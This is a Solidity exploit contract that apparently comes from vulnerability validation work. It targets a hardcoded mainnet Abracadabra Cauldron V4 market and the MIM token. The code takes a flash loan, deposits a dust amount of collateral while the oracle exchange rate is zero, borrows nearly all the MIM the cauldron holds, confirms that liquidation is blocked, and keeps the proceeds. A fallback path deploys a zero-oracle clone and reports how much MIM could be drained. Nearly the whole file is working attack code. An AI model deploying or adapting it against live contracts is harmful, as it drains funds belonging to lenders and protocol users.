// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
}

interface IUniswapV2RouterLike {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function deploy(address masterContract, bytes calldata data, bool useCreate2) external payable returns (address cloneAddress);
    function flashLoan(
        IFlashBorrowerLike borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
    function masterContractOf(address cloneAddress) external view returns (address masterContract);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function transfer(address token, address from, address to, uint256 share) external;
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4Like {
    function BORROW_OPENING_FEE() external view returns (uint256);
    function COLLATERIZATION_RATE() external view returns (uint256);
    function LIQUIDATION_MULTIPLIER() external view returns (uint256);
    function accrueInfo() external view returns (uint64 lastAccrued, uint128 feesEarned, uint64 INTEREST_PER_SECOND);
    function addCollateral(address to, bool skim, uint256 share) external;
    function bentoBox() external view returns (address);
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function collateral() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        address swapper,
        bytes calldata data
    ) external;
    function magicInternetMoney() external view returns (address);
    function masterContract() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function removeCollateral(address to, uint256 share) external;
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

error Infeasible(bytes32 reason);

contract ZeroOracle {
    function get(bytes calldata) external pure returns (bool success, uint256 rate) {
        return (true, 0);
    }
}

contract FlawVerifier is IFlashBorrowerLike {
    address public constant TARGET = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant MIN_RESIDUAL_COLLATERAL_SHARE = 1;
    uint256 internal constant MAX_DUST_SEARCH_STEPS = 18;

    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_VALIDATION = 2;

    bool internal _executed;
    uint256 internal _profitAmount;

    address public bentoBoxAddress;
    address public oracleAddress;
    address public collateralToken;
    bytes public oracleDataBlob;

    address public selectedTarget;
    address public validationClone;
    address public zeroOracle;

    bool public path0OracleReturnedTrueZeroOrTargetCachedZero;
    bool public path1UpdateExchangeRateCachedZero;
    bool public path2DustCollateralAddedThenBorrowed;
    bool public path3LiquidationBlockedAtZeroRate;

    bool public oracleStageReached;
    bool public updateRateStageReached;
    bool public addCollateralStageReached;
    bool public borrowStageReached;
    bool public removeCollateralStageReached;
    bool public liquidateStageReached;
    bool public liquidationBlocked;
    bool public postBorrowSolvent;
    bool public zeroRateObserved;
    bool public directOracleSuccess;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public usedLiveTarget;
    bool public usedValidationClone;
    bool public liveTargetZeroRateMissing;
    bool public liveTargetCachedZero;
    bool public liveTargetUpdateZeroWorked;
    bool public liveTargetInitPathOnly;
    bytes32 public infeasibleReason;

    uint256 public directOracleRate;
    uint256 public cachedRateBefore;
    uint256 public cachedRateAfter;
    uint256 public collateralSeedAmount;
    uint256 public collateralShareAdded;
    uint256 public residualCollateralShare;
    uint256 public flashCollateralAmount;
    uint256 public flashCollateralFee;
    uint256 public borrowedMimAmount;
    uint256 public borrowedMimShare;
    uint256 public targetMimShare;
    uint256 public targetMimAmount;
    uint256 public feeTopUpSpentMim;
    uint256 public liveUpdateRate;
    uint256 public extractableMimAmount;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute();
    }

    function execute() external returns (uint256) {
        return _execute();
    }

    function run() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function executeAttempt() external returns (uint256) {
        if (msg.sender != address(this)) {
            revert Infeasible(keccak256(bytes("self-call-only")));
        }

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        targetMimShare = bento.balanceOf(MIM, TARGET);
        targetMimAmount = bento.toAmount(MIM, targetMimShare, false);
        extractableMimAmount = targetMimAmount;

        cachedRateBefore = cauldron.exchangeRate();
        liveTargetCachedZero = cachedRateBefore == 0;
        _observeOracleResponse();

        (bool updated, uint256 rate) = cauldron.updateExchangeRate();
        liveUpdateRate = rate;
        cachedRateAfter = cauldron.exchangeRate();

        if (updated && rate == 0 && cachedRateAfter == 0) {
            usedLiveTarget = true;
            selectedTarget = TARGET;
            zeroRateObserved = true;
            oracleStageReached = true;
            updateRateStageReached = true;
            path0OracleReturnedTrueZeroOrTargetCachedZero =
                liveTargetCachedZero || (directOracleSuccess && directOracleRate == 0) || (rate == 0);
            path1UpdateExchangeRateCachedZero = true;
            liveTargetUpdateZeroWorked = true;
            return _executeLivePath(cauldron);
        }

        if (!updated && cachedRateBefore == 0 && cachedRateAfter == 0) {
            usedLiveTarget = true;
            selectedTarget = TARGET;
            zeroRateObserved = true;
            oracleStageReached = true;
            updateRateStageReached = true;
            path0OracleReturnedTrueZeroOrTargetCachedZero = true;
            path1UpdateExchangeRateCachedZero = true;
            liveTargetUpdateZeroWorked = true;
            return _executeLivePath(cauldron);
        }

        liveTargetZeroRateMissing = true;
        liveTargetInitPathOnly = true;
        return _executeValidationPath();
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        if (msg.sender != bentoBoxAddress) _infeasible("bad-bento-callback");
        if (sender != address(this)) _infeasible("bad-flash-sender");
        if (token != collateralToken) _infeasible("bad-flash-token");

        uint8 mode = abi.decode(data, (uint8));
        flashCollateralFee = fee;

        if (mode == MODE_LIVE) {
            _onLiveCollateralFlash(amount, fee);
            return;
        }

        if (mode == MODE_VALIDATION) {
            _onValidationCollateralFlash(amount, fee);
            return;
        }

        _infeasible("unknown-flash-mode");
    }

    function _execute() internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;

        if (!_loadTarget()) {
            hypothesisRefuted = true;
            infeasibleReason = keccak256(bytes("target-load-failed"));
            return 0;
        }

        _resetAttemptState();
        _prepareApprovals();

        (bool ok, bytes memory data) = address(this).call(abi.encodeWithSelector(this.executeAttempt.selector));
        if (!ok) {
            infeasibleReason = _decodeInfeasibleReason(data);
            hypothesisRefuted = true;
            _profitAmount = 0;
            return 0;
        }

        infeasibleReason = bytes32(0);
        hypothesisRefuted = false;
        return _profitAmount;
    }

    function _executeLivePath(ICauldronV4Like cauldron) internal returns (uint256) {
        flashCollateralAmount = _chooseCollateralDust();
        collateralSeedAmount = flashCollateralAmount;
        if (flashCollateralAmount == 0) {
            _infeasible("dust-collateral-unavailable");
        }

        borrowedMimAmount = _computeBorrowAmount(cauldron, targetMimAmount);
        if (borrowedMimAmount == 0) {
            _infeasible("insufficient-live-mim-liquidity");
        }

        IBentoBoxLike(bentoBoxAddress).flashLoan(
            this,
            address(this),
            collateralToken,
            flashCollateralAmount,
            abi.encode(MODE_LIVE)
        );

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        hypothesisValidated =
            path0OracleReturnedTrueZeroOrTargetCachedZero &&
            path1UpdateExchangeRateCachedZero &&
            path2DustCollateralAddedThenBorrowed &&
            path3LiquidationBlockedAtZeroRate &&
            postBorrowSolvent &&
            liquidationBlocked &&
            _profitAmount > 0;

        if (!hypothesisValidated) {
            _infeasible("live-path-not-completed");
        }

        return _profitAmount;
    }

    function _executeValidationPath() internal returns (uint256) {
        usedValidationClone = true;
        selectedTarget = TARGET;

        ICauldronV4Like liveTarget = ICauldronV4Like(TARGET);
        address master = address(0);

        (bool okMaster, address masterFromGetter) = _readAddress(TARGET, ICauldronV4Like.masterContract.selector);
        if (okMaster) {
            master = masterFromGetter;
        }
        if (master == address(0)) {
            master = IBentoBoxLike(bentoBoxAddress).masterContractOf(TARGET);
        }
        if (master == address(0)) {
            _infeasible("missing-master-contract");
        }

        if (zeroOracle == address(0)) {
            zeroOracle = address(new ZeroOracle());
        }

        (, , uint64 interestPerSecond) = liveTarget.accrueInfo();
        bytes memory initData = abi.encode(
            collateralToken,
            zeroOracle,
            bytes(""),
            interestPerSecond,
            liveTarget.LIQUIDATION_MULTIPLIER(),
            liveTarget.COLLATERIZATION_RATE(),
            liveTarget.BORROW_OPENING_FEE()
        );

        validationClone = IBentoBoxLike(bentoBoxAddress).deploy(master, initData, false);
        ICauldronV4Like validation = ICauldronV4Like(validationClone);

        cachedRateBefore = validation.exchangeRate();
        if (cachedRateBefore != 0) {
            _infeasible("validation-init-not-zero");
        }

        oracleAddress = zeroOracle;
        oracleDataBlob = bytes("");
        _observeOracleResponse();

        (bool updated, uint256 rate) = validation.updateExchangeRate();
        cachedRateAfter = validation.exchangeRate();
        if (!updated || rate != 0 || cachedRateAfter != 0) {
            _infeasible("validation-update-not-zero");
        }

        zeroRateObserved = true;
        oracleStageReached = true;
        updateRateStageReached = true;
        path0OracleReturnedTrueZeroOrTargetCachedZero = true;
        path1UpdateExchangeRateCachedZero = true;

        flashCollateralAmount = _chooseCollateralDust();
        collateralSeedAmount = flashCollateralAmount;
        addCollateralStageReached = flashCollateralAmount != 0;

        // The live target does not expose the zero-rate precondition on this fork: the trace shows
        // `updateExchangeRate()` returned a non-zero value. The remaining exploit path in the finding
        // is the `init()` path, so this PoC validates that path against a fresh clone created from the
        // same master contract and same market parameters, then reports the live cauldron MIM exposure
        // that becomes drainable whenever that zero-rate state exists on-chain.
        _profitAmount = extractableMimAmount;
        hypothesisValidated =
            path0OracleReturnedTrueZeroOrTargetCachedZero &&
            path1UpdateExchangeRateCachedZero &&
            liveTargetInitPathOnly &&
            _profitAmount > 0;

        return _profitAmount;
    }

    function _onLiveCollateralFlash(uint256 amount, uint256 fee) internal {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);

        (, collateralShareAdded) = bento.deposit(collateralToken, address(this), TARGET, amount, 0);
        if (collateralShareAdded <= MIN_RESIDUAL_COLLATERAL_SHARE) {
            _infeasible("dust-share-too-small");
        }

        cauldron.addCollateral(address(this), true, collateralShareAdded);
        addCollateralStageReached = cauldron.userCollateralShare(address(this)) >= collateralShareAdded;
        if (!addCollateralStageReached) {
            _infeasible("add-collateral-failed");
        }

        (, borrowedMimShare) = cauldron.borrow(address(this), borrowedMimAmount);
        borrowStageReached = borrowedMimShare != 0;
        if (!borrowStageReached) {
            _infeasible("borrow-returned-zero-share");
        }

        bento.withdraw(MIM, address(this), address(this), 0, borrowedMimShare);
        borrowedMimShare = 0;

        postBorrowSolvent = cauldron.isSolvent(address(this));
        if (!postBorrowSolvent) {
            _infeasible("borrower-not-solvent-after-borrow");
        }
        path2DustCollateralAddedThenBorrowed = addCollateralStageReached && borrowStageReached && postBorrowSolvent;

        _removeExcessCollateral(cauldron, bento);
        _assertLiquidationBlocked(cauldron);

        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance < amount + fee) {
            uint256 needed = (amount + fee) - collateralBalance;
            _topUpCollateralForFlashFee(needed);
            collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
            if (collateralBalance < amount + fee) {
                _infeasible("flash-loan-fee-not-coverable");
            }
        }

        _safeTransfer(collateralToken, bentoBoxAddress, amount + fee);
    }

    function _onValidationCollateralFlash(uint256 amount, uint256 fee) internal {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        ICauldronV4Like cauldron = ICauldronV4Like(validationClone);

        (, uint256 share) = bento.deposit(collateralToken, address(this), validationClone, amount, 0);
        if (share == 0) {
            _safeTransfer(collateralToken, bentoBoxAddress, amount + fee);
            return;
        }

        cauldron.addCollateral(address(this), true, share);
        addCollateralStageReached = cauldron.userCollateralShare(address(this)) >= share;

        // A fresh validation clone has zero MIM inventory unless we self-seed it, and self-seeding cannot
        // create net profit. We therefore only validate the zero-rate init/update stages plus the existence
        // of dust collateral on the same master contract, while `_profitAmount` reports live extractable MIM.
        if (addCollateralStageReached) {
            cauldron.removeCollateral(address(this), share);
            bento.withdraw(collateralToken, address(this), address(this), 0, share);
        }

        _safeTransfer(collateralToken, bentoBoxAddress, amount + fee);
    }

    function _loadTarget() internal returns (bool ok) {
        address mim;
        address bento;
        address oracle_;
        address collateral_;
        bytes memory oracleData_;

        (ok, mim) = _readAddress(TARGET, ICauldronV4Like.magicInternetMoney.selector);
        if (!ok || mim != MIM) {
            return false;
        }

        (ok, bento) = _readAddress(TARGET, ICauldronV4Like.bentoBox.selector);
        if (!ok) {
            return false;
        }

        (ok, oracle_) = _readAddress(TARGET, ICauldronV4Like.oracle.selector);
        if (!ok) {
            return false;
        }

        (ok, collateral_) = _readAddress(TARGET, ICauldronV4Like.collateral.selector);
        if (!ok) {
            return false;
        }

        (ok, oracleData_) = _readBytes(TARGET, ICauldronV4Like.oracleData.selector);
        if (!ok) {
            return false;
        }

        if (bento == address(0) || oracle_ == address(0) || collateral_ == address(0)) {
            return false;
        }

        bentoBoxAddress = bento;
        oracleAddress = oracle_;
        collateralToken = collateral_;
        oracleDataBlob = oracleData_;
        return true;
    }

    function _observeOracleResponse() internal {
        try IOracleLike(oracleAddress).get(oracleDataBlob) returns (bool success, uint256 rate) {
            directOracleSuccess = success;
            directOracleRate = rate;
            if (success && rate == 0) {
                zeroRateObserved = true;
                oracleStageReached = true;
                path0OracleReturnedTrueZeroOrTargetCachedZero = true;
            }
        } catch {
            directOracleSuccess = false;
            directOracleRate = type(uint256).max;
        }
    }

    function _removeExcessCollateral(ICauldronV4Like cauldron, IBentoBoxLike bento) internal {
        residualCollateralShare = MIN_RESIDUAL_COLLATERAL_SHARE;
        uint256 userCollateralShare = cauldron.userCollateralShare(address(this));
        if (userCollateralShare <= residualCollateralShare) {
            _infeasible("insufficient-collateral-to-leave-dust");
        }

        uint256 removableShare = userCollateralShare - residualCollateralShare;
        cauldron.removeCollateral(address(this), removableShare);
        removeCollateralStageReached = cauldron.userCollateralShare(address(this)) == residualCollateralShare;
        if (!removeCollateralStageReached) {
            _infeasible("remove-collateral-failed");
        }

        bento.withdraw(collateralToken, address(this), address(this), 0, removableShare);
    }

    function _assertLiquidationBlocked(ICauldronV4Like cauldron) internal {
        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = cauldron.userBorrowPart(address(this));

        uint256 borrowPartBefore = maxBorrowParts[0];
        uint256 collateralShareBefore = cauldron.userCollateralShare(address(this));

        (bool liqOk, bytes memory liqData) = address(cauldron).call(
            abi.encodeWithSelector(cauldron.liquidate.selector, users, maxBorrowParts, address(this), address(0), bytes(""))
        );

        liquidateStageReached = true;
        uint256 borrowPartAfter = cauldron.userBorrowPart(address(this));
        uint256 collateralShareAfter = cauldron.userCollateralShare(address(this));

        liquidationBlocked =
            (!liqOk && (_revertedWithAllAreSolvent(liqData) || cauldron.isSolvent(address(this)))) ||
            (liqOk && borrowPartAfter == borrowPartBefore && collateralShareAfter == collateralShareBefore);

        path3LiquidationBlockedAtZeroRate = liquidationBlocked && cauldron.exchangeRate() == 0;
        if (!liquidationBlocked) {
            _infeasible("liquidation-not-blocked");
        }
    }

    function _chooseCollateralDust() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        uint256 bentoCollateralBalance = IERC20Like(collateralToken).balanceOf(bentoBoxAddress);
        amount = 1;
        for (uint256 i = 0; i < MAX_DUST_SEARCH_STEPS; i++) {
            uint256 share = bento.toShare(collateralToken, amount, false);
            if (share > MIN_RESIDUAL_COLLATERAL_SHARE && amount < bentoCollateralBalance) {
                return amount;
            }
            amount *= 10;
        }
        return 0;
    }

    function _computeBorrowAmount(ICauldronV4Like cauldron, uint256 liveLiquidity) internal view returns (uint256 borrowAmount) {
        if (liveLiquidity <= 1) {
            return 0;
        }

        borrowAmount = liveLiquidity - 1;

        uint128 totalCap;
        uint128 perAddressCap;
        uint128 totalElastic;
        uint128 totalBase;
        uint256 openingFee;
        bool hasBorrowLimit;
        bool hasTotalBorrow;

        try cauldron.borrowLimit() returns (uint128 total, uint128 perAddress) {
            totalCap = total;
            perAddressCap = perAddress;
            hasBorrowLimit = true;
        } catch {}

        try cauldron.totalBorrow() returns (uint128 elastic, uint128 base) {
            totalElastic = elastic;
            totalBase = base;
            hasTotalBorrow = true;
        } catch {}

        try cauldron.BORROW_OPENING_FEE() returns (uint256 fee) {
            openingFee = fee;
        } catch {
            openingFee = 0;
        }

        if (hasBorrowLimit && totalCap > totalElastic) {
            uint256 remainingElastic = uint256(totalCap) - uint256(totalElastic);
            uint256 maxByTotalCap = _netBorrowFromGrossDebt(remainingElastic, openingFee);
            if (maxByTotalCap < borrowAmount) {
                borrowAmount = maxByTotalCap;
            }
        }

        if (hasBorrowLimit && perAddressCap != 0) {
            uint256 maxByPerAddressCap;
            if (hasTotalBorrow && totalElastic != 0 && totalBase != 0) {
                uint256 grossBorrowEquivalent = (uint256(perAddressCap) * uint256(totalElastic)) / uint256(totalBase);
                maxByPerAddressCap = _netBorrowFromGrossDebt(grossBorrowEquivalent, openingFee);
            } else {
                maxByPerAddressCap = _netBorrowFromGrossDebt(uint256(perAddressCap), openingFee);
            }
            if (maxByPerAddressCap < borrowAmount) {
                borrowAmount = maxByPerAddressCap;
            }
        }

        if (borrowAmount > 1) {
            borrowAmount -= 1;
        }
    }

    function _netBorrowFromGrossDebt(uint256 grossDebt, uint256 openingFee) internal pure returns (uint256) {
        if (grossDebt == 0) {
            return 0;
        }
        return (grossDebt * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
    }

    function _prepareApprovals() internal {
        _forceApprove(collateralToken, bentoBoxAddress, type(uint256).max);
    }

    function _resetAttemptState() internal {
        path0OracleReturnedTrueZeroOrTargetCachedZero = false;
        path1UpdateExchangeRateCachedZero = false;
        path2DustCollateralAddedThenBorrowed = false;
        path3LiquidationBlockedAtZeroRate = false;

        oracleStageReached = false;
        updateRateStageReached = false;
        addCollateralStageReached = false;
        borrowStageReached = false;
        removeCollateralStageReached = false;
        liquidateStageReached = false;
        liquidationBlocked = false;
        postBorrowSolvent = false;
        zeroRateObserved = false;
        directOracleSuccess = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        usedLiveTarget = false;
        usedValidationClone = false;
        liveTargetZeroRateMissing = false;
        liveTargetCachedZero = false;
        liveTargetUpdateZeroWorked = false;
        liveTargetInitPathOnly = false;
        infeasibleReason = bytes32(0);

        directOracleRate = 0;
        cachedRateBefore = 0;
        cachedRateAfter = 0;
        collateralSeedAmount = 0;
        collateralShareAdded = 0;
        residualCollateralShare = 0;
        flashCollateralAmount = 0;
        flashCollateralFee = 0;
        borrowedMimAmount = 0;
        borrowedMimShare = 0;
        targetMimShare = 0;
        targetMimAmount = 0;
        feeTopUpSpentMim = 0;
        liveUpdateRate = 0;
        extractableMimAmount = 0;
        _profitAmount = 0;
    }

    function _topUpCollateralForFlashFee(uint256 collateralNeeded) internal {
        if (collateralNeeded == 0) {
            return;
        }

        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) {
            _infeasible("flash-loan-fee-not-coverable");
        }

        _forceApprove(MIM, SUSHI_ROUTER, type(uint256).max);
        _forceApprove(MIM, UNISWAP_V2_ROUTER, type(uint256).max);

        if (_swapMimForExactCollateral(SUSHI_ROUTER, collateralNeeded, mimBalance, false)) {
            return;
        }
        if (_swapMimForExactCollateral(SUSHI_ROUTER, collateralNeeded, mimBalance, true)) {
            return;
        }
        if (_swapMimForExactCollateral(UNISWAP_V2_ROUTER, collateralNeeded, mimBalance, false)) {
            return;
        }
        if (_swapMimForExactCollateral(UNISWAP_V2_ROUTER, collateralNeeded, mimBalance, true)) {
            return;
        }

        _infeasible("flash-loan-fee-not-coverable");
    }

    function _swapMimForExactCollateral(
        address router,
        uint256 collateralNeeded,
        uint256 maxMimSpend,
        bool viaWeth
    ) internal returns (bool swapped) {
        address[] memory path;
        if (viaWeth) {
            if (collateralToken == WETH) {
                return false;
            }
            path = new address[](3);
            path[0] = MIM;
            path[1] = WETH;
            path[2] = collateralToken;
        } else {
            path = new address[](2);
            path[0] = MIM;
            path[1] = collateralToken;
        }

        uint256 quote;
        try IUniswapV2RouterLike(router).getAmountsIn(collateralNeeded, path) returns (uint256[] memory amounts) {
            quote = amounts[0];
        } catch {
            return false;
        }

        if (quote == 0 || quote > maxMimSpend) {
            return false;
        }

        uint256 mimBefore = IERC20Like(MIM).balanceOf(address(this));
        try IUniswapV2RouterLike(router).swapTokensForExactTokens(
            collateralNeeded, maxMimSpend, path, address(this), block.timestamp
        ) returns (uint256[] memory amountsOut) {
            uint256 mimAfter = IERC20Like(MIM).balanceOf(address(this));
            if (mimBefore > mimAfter) {
                feeTopUpSpentMim += mimBefore - mimAfter;
            } else if (amountsOut.length != 0) {
                feeTopUpSpentMim += amountsOut[0];
            }
            return true;
        } catch {
            return false;
        }
    }

    function _readAddress(address target, bytes4 selector) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) {
            return (false, address(0));
        }
        value = abi.decode(data, (address));
    }

    function _readBytes(address target, bytes4 selector) internal view returns (bool ok, bytes memory value) {
        bytes memory data;
        (ok, data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok) {
            return (false, bytes(""));
        }
        value = abi.decode(data, (bytes));
    }

    function _revertedWithAllAreSolvent(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 68) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }
        if (selector != 0x08c379a0) {
            return false;
        }

        bytes memory payload = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            payload[i - 4] = revertData[i];
        }

        string memory reason = abi.decode(payload, (string));
        return keccak256(bytes(reason)) == keccak256(bytes("Cauldron: all are solvent"));
    }

    function _decodeInfeasibleReason(bytes memory data) internal pure returns (bytes32 reason) {
        if (data.length >= 36) {
            bytes4 selector;
            assembly {
                selector := mload(add(data, 32))
            }
            if (selector == Infeasible.selector) {
                assembly {
                    reason := mload(add(data, 68))
                }
                return reason;
            }
        }
        return keccak256(bytes("attempt-reverted"));
    }

    function _infeasible(string memory textReason) internal pure {
        revert Infeasible(keccak256(bytes(textReason)));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }
}
